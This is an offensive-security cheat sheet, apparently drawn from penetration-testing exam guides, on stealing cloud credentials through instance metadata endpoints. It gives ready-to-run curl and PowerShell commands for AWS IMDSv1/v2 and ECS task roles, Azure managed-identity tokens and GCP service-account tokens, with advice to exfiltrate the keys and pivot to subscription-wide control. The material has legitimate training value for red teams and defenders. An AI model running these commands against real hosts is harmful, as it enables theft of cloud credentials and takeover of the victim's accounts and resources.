# Cloud - Instance metadata and managed-identity credential theft

## IMDS credential theft, including the IMDSv2 token dance and hop-limit constraint

**Trigger:** You have SSRF against an EC2-hosted app, or command execution on an EC2 instance / ECS task, and want AWS API credentials rather than just files.

Every AWS compute surface hands out role credentials over a link-local address, and reaching it is the standard first pivot from web-app access to cloud-account access. On EC2 the endpoint is 169.254.169.254: list role names at /latest/meta-data/iam/security-credentials/, then fetch that path plus the role name to get a JSON blob with AccessKeyId, SecretAccessKey and Token. IMDSv2 turns this into a two-step: PUT /latest/api/token with an X-aws-ec2-metadata-token-ttl-seconds header to mint a token, then replay it in X-aws-ec2-metadata-token on the GET. That distinction decides whether an SSRF is exploitable at all — a plain GET-only SSRF cannot issue the PUT or set a request header, so IMDSv2 kills it, while an SSRF primitive that controls method and headers (gopher, a full HTTP-client library, a proxy misconfiguration) still works. The other silent killer is the instance metadata hop limit: at the default TTL of 1 a container on the instance cannot reach IMDS at all, so from inside a container assume you are meant to use the container endpoint instead. For ECS and Fargate the task role lives at 169.254.170.2 concatenated with the value of the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, which the runtime injects — read the env var first, do not guess the path. Credentials from any of these are short-lived, so check the Expiration field and re-pull rather than debugging a stale-token error as a permissions problem.

```bash
# EC2, IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# EC2, IMDSv2 (PUT for a token, then replay it as a header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ECS / Fargate task role
curl -s 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# load whatever you recovered
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
```

Source: https://offsecexams.com/cheatsheets/arte-exam---guided-by-redblock

## Managed identity token theft (App Service/Function IDENTITY_ENDPOINT and VM IMDS)

**Trigger:** You have code execution (SSRF, command injection, webshell, or a shell) on an Azure-hosted workload — an App Service/Function, or an Azure VM — and want cloud credentials without any password.

Azure attaches OAuth tokens to workloads via a local metadata endpoint, so code-exec on the host yields ARM/Graph tokens for whatever roles the identity holds. On App Service/Functions the endpoint is not IMDS: read the process env vars IDENTITY_ENDPOINT and IDENTITY_HEADER, then GET that endpoint with the secret in a `secret:` header (the header defeats server-side SSRF that lacks header control). On an Azure VM or VMSS instance the endpoint is IMDS at 169.254.169.254 and requires the `Metadata: true` header — the same IP that appears as a web-SSRF target, but here you use it to mint a real bearer token. Request a token per resource audience you need: `https://management.azure.com` for ARM (then enumerate/act on resources), `https://graph.microsoft.com` for directory, `https://vault.azure.net` for Key Vault, `https://storage.azure.com` for storage. Feed the token into Connect-AzAccount/az to pivot. The identity is often over-privileged (Contributor on a resource group or subscription), turning one workload compromise into subscription-wide control.

```powershell
# App Service / Function (from a shell or SSRF you control on the host):
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "secret:$IDENTITY_HEADER"
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2019-08-01" -H "secret:$IDENTITY_HEADER"
# Azure VM / VMSS via IMDS:
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"   # subscription, RG, VM name
# Use the token:
$t = (curl ... ).access_token ; Connect-AzAccount -AccessToken $t -AccountId <mi-clientid>
```

Source: https://offsecexams.com/cheatsheets/cartp-exam---guided-by-redblock

## Instance metadata credential harvest from a compromised cloud host

**Trigger:** You have command execution on a Linux host and want to know whether it is a cloud instance with an attached identity — check when /sys/class/dmi/id/* names Amazon/Google/Microsoft, when the box has a 169.254 route, or reflexively on any shell on a target of unknown provenance.

A cloud VM's attached role is usually worth more than local root, because the credentials it hands out are valid off-box and against the whole account. All three major providers expose the link-local 169.254.169.254 endpoint (Google also answers on metadata.google.internal), and each has a different anti-SSRF posture that changes how you query it. AWS IMDSv1 is a plain unauthenticated GET: list role names under /latest/meta-data/iam/security-credentials/ then fetch the named role for AccessKeyId, SecretAccessKey and Token. If that returns 401 the instance is on IMDSv2 — first PUT to /latest/api/token with an X-aws-ec2-metadata-token-ttl-seconds header, then replay the returned token as X-aws-ec2-metadata-token on every request. That is trivial from a shell, which is why IMDSv2 stops SSRF but not host compromise. GCP requires a Metadata-Flavor: Google header on every request and returns an OAuth bearer token for the default service account directly, plus custom instance attributes that frequently hold startup scripts with baked-in secrets. Azure requires a Metadata: true header and an api-version query parameter, and its identity endpoint returns a bearer token scoped to whatever resource you name — request https://management.azure.com/ to reach subscription-level APIs. Exfil the credentials and use them from your own machine rather than from the victim, then pivot on what the identity can actually do rather than what it is named.

```bash
# Am I in the cloud, and whose?
cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null
ip route | grep 169.254

# AWS - IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# AWS - IMDSv2 (session token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"

# Azure
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Source: https://offsecexams.com/cheatsheets/lhe-exam---guided-by-redblock
